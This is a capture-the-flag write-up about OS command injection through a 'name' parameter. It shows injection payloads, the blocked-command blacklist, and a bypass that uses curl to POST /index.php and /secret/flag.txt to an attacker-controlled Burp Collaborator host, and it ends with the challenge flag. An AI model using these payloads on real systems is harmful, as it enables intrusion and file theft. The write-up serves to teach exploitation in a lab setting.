**Vulnerability:** OS Command Injection (with blacklist bypass)

### Overview

The application takes user input via a `name` parameter and returns a greeting:

```
Hello <name>
```

![image](https://github.com/user-attachments/assets/f9a188ab-b14d-46e3-a2dc-ae33c6c711a0)


When analyzing how the server handles this input, it became apparent that the `name` field is vulnerable to **OS Command Injection**.

### Exploiting the Vulnerability

When we submit something like:

```
url/?name=shlok; ls
```

The server returns:

```
Hello, shlok
index.php
style.css
```

`ls` is executed, suggesting unsanitized input is passed directly into a system call .

![image](https://github.com/user-attachments/assets/1e5897ec-7555-4454-9571-406cd9da3417)


### Initial Roadblocks

Attempting to read sensitive files such as the flag using common commands like:

```
name=shlok; cat index.php
name=shlok; tac index.php
```

…resulted in error messages indicating **command blocked** was in place. Words like `cat`, `tac`, `more`, `less`, etc., were blocked.

![image](https://github.com/user-attachments/assets/8f3c3b45-4fb8-4bde-8d69-ed60721a55c2)



### Blacklist Bypass via Out-of-Band (OOB) Exfiltration

To bypass the blacklist and still exfiltrate the contents of the flag, I used **curl** to send the output of a command to a **Burp Collaborator** or similar request bin server.

Here’s the payload format used:

```
?name=shlok; curl -X POST -d @/index.php http://<your-burp-collab>.oastify.com
```

This command sends the contents of `/index.php` as the POST body to a listener server I control.

![image](https://github.com/user-attachments/assets/446e0a58-cc17-493f-9439-553bbf5908fa)


### Final Payload Example

```bash
name=shlok; curl -X POST -d @/secret/flag.txt http://<your-burp-collab>.oastify.com
```
![image](https://github.com/user-attachments/assets/7be8a091-738d-4c85-8233-77e46a345f3d)


#### Flag: flag{r3str1ct3d_d0esn7_m34n_s3cur3}
